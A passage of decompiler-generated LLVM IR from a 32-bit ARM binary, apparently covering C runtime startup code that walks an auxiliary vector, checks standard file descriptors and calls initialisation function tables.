  %v2_ec50 = inttoptr i32 %v4_ec44 to i32*
  store i32 %v2_ec3c, i32* %v2_ec50, align 4
  br i1 %v9_ec48, label %bb, label %bb75

bb:                                               ; preds = %dec_label_pc_ec10
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %dec_label_pc_ec10, %bb
  %v0_ec58 = load i32, i32* %r2.global-to-local, align 4
  %v1_ec58 = load i32, i32* %r1.global-to-local, align 4
  %v2_ec58 = inttoptr i32 %v1_ec58 to i32*
  store i32 %v0_ec58, i32* %v2_ec58, align 4
  %v2_ec5c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_ec5c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 1988, i32* %r2.global-to-local, align 4
  %v0_ec68 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_ec68, i32* @r6, align 4
  br i1 %v9_ec48, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_ec7053 = add i32 %v2_ec5c, 1988
  %v4_ec7054 = inttoptr i32 %v3_ec7053 to i32*
  store i32 %arg6, i32* %v4_ec7054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_ec6c = load i32, i32* %ip.global-to-local, align 4
  %v2_ec6c = load i32, i32* @r7, align 4
  %v3_ec6c = add i32 %v2_ec6c, %v1_ec6c
  store i32 %v3_ec6c, i32* %r3.global-to-local, align 4
  %v3_ec7050 = add i32 %v2_ec5c, 1988
  %v4_ec7051 = inttoptr i32 %v3_ec7050 to i32*
  store i32 %arg6, i32* %v4_ec7051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_ec7c = load i32, i32* %r3.global-to-local, align 4
  %v2_ec7c = load i32, i32* %r4.global-to-local, align 4
  %v3_ec7c = inttoptr i32 %v2_ec7c to i32*
  store i32 %v1_ec7c, i32* %v3_ec7c, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_ec80 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_ec80, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_ec88 = bitcast i32* %stack_var_-120 to i8*
  %v4_ec88 = call i32 @function_bff0(i8* %v3_ec88, i32 0, i32 120)
  store i32 %v4_ec88, i32* %r0.global-to-local, align 4
  %v0_ec8c = load i32, i32* %r4.global-to-local, align 4
  %v1_ec8c = inttoptr i32 %v0_ec8c to i32*
  %v2_ec8c = load i32, i32* %v1_ec8c, align 4
  br label %dec_label_pc_ec98

dec_label_pc_ec98:                                ; preds = %dec_label_pc_ec98, %bb77
  %storemerge = phi i32 [ %v2_ec8c, %bb77 ], [ %v1_eca4, %dec_label_pc_ec98 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_ec98 = inttoptr i32 %storemerge to i32*
  %v2_ec98 = load i32, i32* %v1_ec98, align 4
  store i32 %v2_ec98, i32* %r3.global-to-local, align 4
  %v2_ec9c = icmp eq i32 %v2_ec98, 0
  %v1_eca4 = add i32 %storemerge, 4
  br i1 %v2_ec9c, label %dec_label_pc_eca4, label %dec_label_pc_ec98

dec_label_pc_eca4:                                ; preds = %dec_label_pc_ec98
  store i32 %v1_eca4, i32* @r4, align 4
  store i32 %v2_ec80, i32* @r5, align 4
  %v1_ecc830 = inttoptr i32 %v1_eca4 to i32*
  %v2_ecc831 = load i32, i32* %v1_ecc830, align 4
  store i32 %v2_ecc831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eccc33 = icmp eq i32 %v2_ecc831, 0
  store i1 %v2_eccc33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eccc33, label %dec_label_pc_ecd4, label %dec_label_pc_ecb0

dec_label_pc_ecb0:                                ; preds = %dec_label_pc_eca4, %dec_label_pc_ecc8
  %v4_ecb8 = phi i32 [ %v1_ecc4, %dec_label_pc_ecc8 ], [ %v1_eca4, %dec_label_pc_eca4 ]
  %v5_ecb4 = phi i32 [ %v2_ecc8, %dec_label_pc_ecc8 ], [ %v2_ecc831, %dec_label_pc_eca4 ]
  %v2_ecb0 = icmp ugt i32 %v5_ecb4, 13
  store i1 %v2_ecb0, i1* %cpsr_c.global-to-local, align 1
  %v7_ecb0 = icmp eq i32 %v5_ecb4, 14
  store i1 %v7_ecb0, i1* %cpsr_z.global-to-local, align 1
  %v2_ecb4 = xor i1 %v2_ecb0, true
  %v3_ecb4 = or i1 %v7_ecb0, %v2_ecb4
  br i1 %v3_ecb4, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_ecb0
  %v4_ecb4 = load i32, i32* @r5, align 4
  %v6_ecb4 = and i32 %v5_ecb4, 536870912
  %v7_ecb4 = icmp ne i32 %v6_ecb4, 0
  store i1 %v7_ecb4, i1* %cpsr_c.global-to-local, align 1
  %v8_ecb4 = mul i32 %v5_ecb4, 8
  %v9_ecb4 = add i32 %v4_ecb4, %v8_ecb4
  store i32 %v9_ecb4, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_ecb0, %bb78
  %v1_ecc0 = phi i1 [ %v2_ecb0, %dec_label_pc_ecb0 ], [ %v7_ecb4, %bb78 ]
  %v2_ecb8 = xor i1 %v1_ecc0, true
  %v3_ecb8 = or i1 %v7_ecb0, %v2_ecb8
  br i1 %v3_ecb8, label %bb80, label %dec_label_pc_ecc8

bb80:                                             ; preds = %bb79
  store i32 %v4_ecb8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ecc8

dec_label_pc_ecc8:                                ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_ecb8, i32 ptrtoint (i32* @global_var_bfd0.394 to i32))
  %v0_ecc4 = load i32, i32* @r4, align 4
  %v1_ecc4 = add i32 %v0_ecc4, 8
  store i32 %v1_ecc4, i32* @r4, align 4
  %v1_ecc8 = inttoptr i32 %v1_ecc4 to i32*
  %v2_ecc8 = load i32, i32* %v1_ecc8, align 4
  store i32 %v2_ecc8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eccc = icmp eq i32 %v2_ecc8, 0
  store i1 %v2_eccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eccc, label %dec_label_pc_ecd4, label %dec_label_pc_ecb0

dec_label_pc_ecd4:                                ; preds = %dec_label_pc_ecc8, %dec_label_pc_eca4
  store i32 %v2_ec80, i32* %r0.global-to-local, align 4
  %v1_ecd8 = call i32 @function_11f7c(i32 %v2_ec80)
  store i32 %v1_ecd8, i32* %r0.global-to-local, align 4
  %v1_ecdc = call i32 @function_ebb8(i32 %v1_ecd8)
  store i32 %v1_ecdc, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_ece4 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_ece4, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_ecec = add i32 %v2_ece4, 148
  %v3_ecec = inttoptr i32 %v2_ecec to i32*
  %v4_ecec = load i32, i32* %v3_ecec, align 4
  store i32 %v4_ecec, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ecf4 = icmp eq i32 %tmp66, 0
  store i1 %v2_ecf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ecf4, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_ecd4
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_ecd4, %bb81
  %v0_ed00 = phi i32 [ %tmp66, %dec_label_pc_ecd4 ], [ 4096, %bb81 ]
  %v3_ecfc = icmp eq i32 %tmp65, -1
  store i1 %v3_ecfc, i1* %cpsr_c.global-to-local, align 1
  %v8_ecfc = icmp eq i32 %tmp65, -1
  store i1 %v8_ecfc, i1* %cpsr_z.global-to-local, align 1
  %v2_ed00 = inttoptr i32 %v4_ecec to i32*
  store i32 %v0_ed00, i32* %v2_ed00, align 4
  br i1 %v3_ecfc, label %dec_label_pc_ed08, label %dec_label_pc_ed30

dec_label_pc_ed08:                                ; preds = %bb82
  %v0_ed08 = call i32 @function_f3b0()
  store i32 %v0_ed08, i32* @r0, align 4
  store i32 %v0_ed08, i32* %r4.global-to-local, align 4
  %v0_ed10 = call i32 @function_f320()
  store i32 %v0_ed10, i32* @r0, align 4
  %v3_ed14 = icmp uge i32 %v0_ed08, %v0_ed10
  store i1 %v3_ed14, i1* %cpsr_c.global-to-local, align 1
  %v9_ed14 = icmp eq i32 %v0_ed08, %v0_ed10
  store i1 %v9_ed14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ed14, label %dec_label_pc_ed1c, label %dec_label_pc_ed58

dec_label_pc_ed1c:                                ; preds = %dec_label_pc_ed08
  %v1_ed1c = call i32 @function_f334(i32 %v0_ed10)
  store i32 %v1_ed1c, i32* @r0, align 4
  store i32 %v1_ed1c, i32* %r4.global-to-local, align 4
  %v0_ed24 = call i32 @function_f30c()
  store i32 %v0_ed24, i32* %r0.global-to-local, align 4
  %v3_ed28 = icmp uge i32 %v1_ed1c, %v0_ed24
  store i1 %v3_ed28, i1* %cpsr_c.global-to-local, align 1
  %v9_ed28 = icmp eq i32 %v1_ed1c, %v0_ed24
  store i1 %v9_ed28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ed28, label %dec_label_pc_ed30, label %dec_label_pc_ed58

dec_label_pc_ed30:                                ; preds = %dec_label_pc_ed1c, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_ecfc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_ecfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ecfc, label %dec_label_pc_ed80, label %dec_label_pc_ed3c

dec_label_pc_ed3c:                                ; preds = %dec_label_pc_ed30
  store i32 %tmp64, i32* @r3, align 4
  %v3_ed40 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_ed40, i1* %cpsr_c.global-to-local, align 1
  %v9_ed40 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_ed40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ed40, label %dec_label_pc_ed48, label %dec_label_pc_ed58

dec_label_pc_ed48:                                ; preds = %dec_label_pc_ed3c
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_ed50 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_ed50, i1* %cpsr_c.global-to-local, align 1
  %v9_ed50 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_ed50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ed50, label %dec_label_pc_ed80, label %dec_label_pc_ed58

dec_label_pc_ed58:                                ; preds = %dec_label_pc_ed3c, %dec_label_pc_ed1c, %dec_label_pc_ed08, %dec_label_pc_ed48
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_ed64 = call i32 @function_eb64(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_ed6c = load i32, i32* @r4, align 4
  store i32 %v0_ed6c, i32* %r1.global-to-local, align 4
  %v2_ed70 = call i32 @function_eb64(i32 1, i32 %v0_ed6c)
  %v0_ed74 = load i32, i32* @r4, align 4
  store i32 %v0_ed74, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_ed7c = call i32 @function_eb64(i32 2, i32 %v0_ed74)
  store i32 %v2_ed7c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ed80

dec_label_pc_ed80:                                ; preds = %dec_label_pc_ed48, %dec_label_pc_ed30, %dec_label_pc_ed58
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 276, i32* %r3.global-to-local, align 4
  %v2_ed88 = load i32, i32* %arg3, align 4
  store i32 %v2_ed88, i32* %r2.global-to-local, align 4
  %v2_ed8c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_ed8c, i32* %r1.global-to-local, align 4
  %v3_ed90 = add i32 %v2_ed8c, 276
  %v4_ed90 = inttoptr i32 %v3_ed90 to i32*
  store i32 %v2_ed88, i32* %v4_ed90, align 4
  %v0_ed94 = load i32, i32* %r0.global-to-local, align 4
  %v1_ed94 = inttoptr i32 %v0_ed94 to i32*
  %v2_ed94 = load i32, i32* %v1_ed94, align 4
  store i32 %v2_ed94, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed98 = icmp eq i32 %v2_ed94, 0
  store i1 %v2_ed98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed98, label %bb84, label %dec_label_pc_eda0

dec_label_pc_eda0:                                ; preds = %dec_label_pc_ed80
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_eda4 = load i32, i32* %r1.global-to-local, align 4
  %v2_eda4 = add i32 %v0_eda4, 164
  %v3_eda4 = inttoptr i32 %v2_eda4 to i32*
  %v4_eda4 = load i32, i32* %v3_eda4, align 4
  store i32 %v4_eda4, i32* %r3.global-to-local, align 4
  %v2_eda8 = inttoptr i32 %v4_eda4 to i32*
  store i32 %v2_ed94, i32* %v2_eda8, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_edb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_edb0 = inttoptr i32 %v0_edb0 to i32*
  %v2_edb0 = load i32, i32* %v1_edb0, align 4
  store i32 %v2_edb0, i32* %r0.global-to-local, align 4
  %v4_edb4 = call i32 @function_11740(i32 %v2_edb0, i32 47, i32 %v2_ed88, i32 %v4_eda4)
  store i32 %v4_edb4, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_edbc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_edbc, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_edc0 = icmp eq i32 %v4_edb4, 0
  store i1 %v2_edc0, i1* %cpsr_z.global-to-local, align 1
  %v2_edc4 = add i32 %v2_edbc, 96
  %v3_edc4 = inttoptr i32 %v2_edc4 to i32*
  %v4_edc4 = load i32, i32* %v3_edc4, align 4
  store i32 %v4_edc4, i32* %r2.global-to-local, align 4
  br i1 %v2_edc0, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_eda0
  %v2_edcc58 = inttoptr i32 %v4_edc4 to i32*
  store i32 0, i32* %v2_edcc58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_eda0
  %v2_edc8 = add i32 %v4_edb4, 1
  store i32 %v2_edc8, i32* %r3.global-to-local, align 4
  %v2_edcc = inttoptr i32 %v4_edc4 to i32*
  store i32 %v4_edb4, i32* %v2_edcc, align 4
  %v1_edd0 = load i32, i32* %r3.global-to-local, align 4
  %v2_edd0 = load i32, i32* %r2.global-to-local, align 4
  %v3_edd0 = inttoptr i32 %v2_edd0 to i32*
  store i32 %v1_edd0, i32* %v3_edd0, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_ed80
  %v2_ede0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_ede0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_edec = add i32 %v2_ede0, -12
  store i32 %v2_edec, i32* %r5.global-to-local, align 4
  store i32 1984, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_edfc = add i32 %v2_ede0, 1984
  %v4_edfc = inttoptr i32 %v3_edfc to i32*
  store i32 %arg5, i32* %v4_edfc, align 4
  %v0_ee1418 = load i32, i32* %r4.global-to-local, align 4
  %v1_ee1419 = load i32, i32* %r7.global-to-local, align 4
  %v3_ee1421 = icmp uge i32 %v0_ee1418, %v1_ee1419
  store i1 %v3_ee1421, i1* %cpsr_c.global-to-local, align 1
  %v9_ee1427 = icmp eq i32 %v0_ee1418, %v1_ee1419
  store i1 %v9_ee1427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ee1421, label %dec_label_pc_ee48.lr.ph, label %dec_label_pc_ee04

dec_label_pc_ee04:                                ; preds = %bb84, %dec_label_pc_ee04
  %v1_ee04 = phi i32 [ %v1_ee10, %dec_label_pc_ee04 ], [ %v0_ee1418, %bb84 ]
  %v0_ee04 = load i32, i32* %r5.global-to-local, align 4
  %v2_ee04 = and i32 %v1_ee04, 1073741824
  %v3_ee04 = icmp ne i32 %v2_ee04, 0
  store i1 %v3_ee04, i1* %cpsr_c.global-to-local, align 1
  %v4_ee04 = mul i32 %v1_ee04, 4
  %v5_ee04 = add i32 %v4_ee04, %v0_ee04
  %v6_ee04 = inttoptr i32 %v5_ee04 to i32*
  %v7_ee04 = load i32, i32* %v6_ee04, align 4
  store i32 %v7_ee04, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_ee04)
  %v0_ee10 = load i32, i32* %r4.global-to-local, align 4
  %v1_ee10 = add i32 %v0_ee10, 1
  store i32 %v1_ee10, i32* %r4.global-to-local, align 4
  %v1_ee14 = load i32, i32* %r7.global-to-local, align 4
  %v3_ee14 = icmp uge i32 %v1_ee10, %v1_ee14
  store i1 %v3_ee14, i1* %cpsr_c.global-to-local, align 1
  %v9_ee14 = icmp eq i32 %v1_ee10, %v1_ee14
  store i1 %v9_ee14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ee14, label %dec_label_pc_ee48.lr.ph, label %dec_label_pc_ee04

dec_label_pc_ee48.lr.ph:                          ; preds = %dec_label_pc_ee04, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee1c = icmp eq i32 %v0_ec68, 0
  store i1 %v2_ee1c, i1* %cpsr_z.global-to-local, align 1
  %v2_ee24 = xor i1 %v2_ee1c, true
  call void @__pseudo_cond_branch(i1 %v2_ee24, i32 %v0_ec68)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_ee30 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_ee3c = add i32 %v2_ee30, -12
  store i32 %v2_ee3c, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ee48

dec_label_pc_ee48:                                ; preds = %dec_label_pc_ee48.dec_label_pc_ee48_crit_edge, %dec_label_pc_ee48.lr.ph
  %v1_ee48 = phi i32 [ %v1_ee54, %dec_label_pc_ee48.dec_label_pc_ee48_crit_edge ], [ 0, %dec_label_pc_ee48.lr.ph ]
  %v0_ee48 = phi i32 [ %v0_ee48.pre, %dec_label_pc_ee48.dec_label_pc_ee48_crit_edge ], [ %v2_ee3c, %dec_label_pc_ee48.lr.ph ]
  %v2_ee48 = and i32 %v1_ee48, 1073741824
  %v3_ee48 = icmp ne i32 %v2_ee48, 0
  store i1 %v3_ee48, i1* %cpsr_c.global-to-local, align 1
  %v4_ee48 = mul i32 %v1_ee48, 4
  %v5_ee48 = add i32 %v4_ee48, %v0_ee48
  %v6_ee48 = inttoptr i32 %v5_ee48 to i32*
  %v7_ee48 = load i32, i32* %v6_ee48, align 4
  store i32 %v7_ee48, i32* %ip.global-to-local, align 4
  store i32 61012, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_ee48)
  %v0_ee54 = load i32, i32* @r4, align 4
  %v1_ee54 = add i32 %v0_ee54, 1
  store i32 %v1_ee54, i32* @r4, align 4
  %v1_ee58 = load i32, i32* @r7, align 4
  %v3_ee58 = icmp uge i32 %v1_ee54, %v1_ee58
  store i1 %v3_ee58, i1* %cpsr_c.global-to-local, align 1
  %v9_ee58 = icmp eq i32 %v1_ee54, %v1_ee58
  store i1 %v9_ee58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ee58, label %dec_label_pc_ee60, label %dec_label_pc_ee48.dec_label_pc_ee48_crit_edge

dec_label_pc_ee48.dec_label_pc_ee48_crit_edge:    ; preds = %dec_label_pc_ee48
  %v0_ee48.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_ee48

dec_label_pc_ee60:                                ; preds = %dec_label_pc_ee48
  %v2_ee64.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_ee64.pre, i32* %r0.global-to-local, align 4
  %v2_ee68 = add i32 %v2_ee64.pre, -70404
  store i32 %v2_ee68, i32* %r2.global-to-local, align 4
  store i32 %v2_ee68, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee70 = icmp eq i32 %v2_ee68, 0
  store i1 %v2_ee70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee70, label %dec_label_pc_ee88, label %dec_label_pc_ee78

dec_label_pc_ee78:                                ; preds = %dec_label_pc_ee60
  store i32 61056, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_ee68)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ee84 = load i32, i32* %r0.global-to-local, align 4
  %v2_ee84 = inttoptr i32 %v1_ee84 to i32*
  store i32 0, i32* %v2_ee84, align 4
  %v2_ee8c.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_ee88

dec_label_pc_ee88:                                ; preds = %dec_label_pc_ee60, %dec_label_pc_ee78
  %v2_ee8c = phi i32 [ %v2_ee64.pre, %dec_label_pc_ee60 ], [ %v2_ee8c.pre, %dec_label_pc_ee78 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_ee8c, i32* %r1.global-to-local, align 4
  %v2_ee90 = add i32 %v2_ee8c, 128
  %v3_ee90 = inttoptr i32 %v2_ee90 to i32*
  %v4_ee90 = load i32, i32* %v3_ee90, align 4
  store i32 %v4_ee90, i32* %r2.global-to-local, align 4
  store i32 %v4_ee90, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee98 = icmp eq i32 %v4_ee90, 0
  store i1 %v2_ee98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee98, label %dec_label_pc_eeb0, label %dec_label_pc_eea0

dec_label_pc_eea0:                                ; preds = %dec_label_pc_ee88
  store i32 61096, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_ee90)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_eeac = load i32, i32* %r0.global-to-local, align 4
  %v2_eeac = inttoptr i32 %v1_eeac to i32*
  store i32 0, i32* %v2_eeac, align 4
  br label %dec_label_pc_eeb0

dec_label_pc_eeb0:                                ; preds = %dec_label_pc_ee88, %dec_label_pc_eea0
  %v2_eeb0 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_eeb0, i32* @r0, align 4
  %v1_eeb4 = call i32 @function_f12c(i32 %v2_eeb0)
  store i32 %v1_eeb4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eeb8 = icmp eq i32 %v1_eeb4, 0
  store i1 %v2_eeb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eeb8, label %dec_label_pc_eec0, label %dec_label_pc_ef0c

dec_label_pc_eec0:                                ; preds = %dec_label_pc_eeb0
  %v0_eec0 = call i32 @function_f150()
  store i32 %v0_eec0, i32* %r0.global-to-local, align 4
  %v1_eec4 = add i32 %v0_eec0, -1168
  store i32 %v1_eec4, i32* %r2.global-to-local, align 4
  %v2_eecc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_eecc, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_eed8 = add i32 %v2_eecc, 56
  %v3_eed8 = inttoptr i32 %v2_eed8 to i32*
  %v4_eed8 = load i32, i32* %v3_eed8, align 4
  store i32 %v4_eed8, i32* %ip.global-to-local, align 4
  store i32 %v2_eeb0, i32* %r3.global-to-local, align 4
  %v2_eee8 = add i32 %v0_eec0, -1040
  %v3_eee8 = inttoptr i32 %v2_eee8 to i32*
  store i32 %v2_eeb0, i32* %v3_eee8, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_eef4 = load i32, i32* %ip.global-to-local, align 4
  %v1_eef4 = inttoptr i32 %v0_eef4 to i32*
  %v2_eef4 = load i32, i32* %v1_eef4, align 4
  store i32 %v2_eef4, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_ef04 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_efa8

dec_label_pc_ef0c:                                ; preds = %dec_label_pc_eeb0
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_ef10 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_ef10, i32* %ip.global-to-local, align 4
  %v2_ef14 = add i32 %v2_ef10, 40
  %v3_ef14 = inttoptr i32 %v2_ef14 to i32*
  %v4_ef14 = load i32, i32* %v3_ef14, align 4
  store i32 %v4_ef14, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_ef14)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_ef24 = load i32, i32* %stack_var_-416, align 4
  %v2_ef28 = add i32 %v2_ef24, 120
  %v3_ef28 = inttoptr i32 %v2_ef28 to i32*
  %v4_ef28 = load i32, i32* %v3_ef28, align 4
  store i32 %v4_ef28, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ef2c

dec_label_pc_ef2c:                                ; preds = %dec_label_pc_ef60.dec_label_pc_ef2c_crit_edge, %dec_label_pc_ef0c
  %v0_ef2c = phi i32 [ %v0_ef2c.pre, %dec_label_pc_ef60.dec_label_pc_ef2c_crit_edge ], [ %v4_ef28, %dec_label_pc_ef0c ]
  %v1_ef2c = inttoptr i32 %v0_ef2c to i32*
  %v2_ef2c = load i32, i32* %v1_ef2c, align 4
  store i32 %v0_ef2c, i32* %r2.global-to-local, align 4
  store i32 %v2_ef2c, i32* %r4.global-to-local, align 4
  %v1_ef38 = add i32 %v2_ef2c, -1
  store i32 %v1_ef38, i32* %r1.global-to-local, align 4
  %v2_ef3c89 = load i32, i32* %v1_ef2c, align 4
  store i32 %v2_ef3c89, i32* %r3.global-to-local, align 4
  %v3_ef4091 = icmp uge i32 %v2_ef3c89, %v2_ef2c
  store i1 %v3_ef4091, i1* %cpsr_c.global-to-local, align 1
  %v9_ef4097 = icmp eq i32 %v2_ef3c89, %v2_ef2c
  store i1 %v9_ef4097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ef4097, label %dec_label_pc_ef48, label %dec_label_pc_ef60

dec_label_pc_ef48:                                ; preds = %dec_label_pc_ef2c, %dec_label_pc_ef48.dec_label_pc_ef3c_crit_edge
  %v0_ef4898 = phi i32 [ %v1_ef40.pre, %dec_label_pc_ef48.dec_label_pc_ef3c_crit_edge ], [ %v2_ef2c, %dec_label_pc_ef2c ]
  store i32 %v0_ef4898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_ef58 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ef58, label %dec_label_pc_ef5c, label %dec_label_pc_ef48.dec_label_pc_ef3c_crit_edge

dec_label_pc_ef48.dec_label_pc_ef3c_crit_edge:    ; preds = %dec_label_pc_ef48
  %v0_ef3c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ef40.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_ef3c = inttoptr i32 %v0_ef3c.pre to i32*
  %v2_ef3c = load i32, i32* %v1_ef3c, align 4
  store i32 %v2_ef3c, i32* %r3.global-to-local, align 4
  %v3_ef40 = icmp uge i32 %v2_ef3c, %v1_ef40.pre
  store i1 %v3_ef40, i1* %cpsr_c.global-to-local, align 1
  %v9_ef40 = icmp eq i32 %v2_ef3c, %v1_ef40.pre
  store i1 %v9_ef40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ef40, label %dec_label_pc_ef48, label %dec_label_pc_ef60

dec_label_pc_ef5c:                                ; preds = %dec_label_pc_ef48
  %v0_ef5c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ef5c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ef60

dec_label_pc_ef60:                                ; preds = %dec_label_pc_ef2c, %dec_label_pc_ef48.dec_label_pc_ef3c_crit_edge, %dec_label_pc_ef5c
  %v0_ef68 = phi i32 [ %v0_ef5c, %dec_label_pc_ef5c ], [ %v2_ef3c89, %dec_label_pc_ef2c ], [ %v2_ef3c, %dec_label_pc_ef48.dec_label_pc_ef3c_crit_edge ]
  %v1_ef60 = phi i32 [ %v0_ef5c, %dec_label_pc_ef5c ], [ %v2_ef2c, %dec_label_pc_ef2c ], [ %v1_ef40.pre, %dec_label_pc_ef48.dec_label_pc_ef3c_crit_edge ]
  %v3_ef60 = icmp uge i32 %v0_ef68, %v1_ef60
  store i1 %v3_ef60, i1* %cpsr_c.global-to-local, align 1
  %v9_ef60 = icmp eq i32 %v0_ef68, %v1_ef60
  store i1 %v9_ef60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ef60, label %dec_label_pc_ef68, label %dec_label_pc_ef60.dec_label_pc_ef2c_crit_edge

dec_label_pc_ef60.dec_label_pc_ef2c_crit_edge:    ; preds = %dec_label_pc_ef60
  %v0_ef2c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ef2c

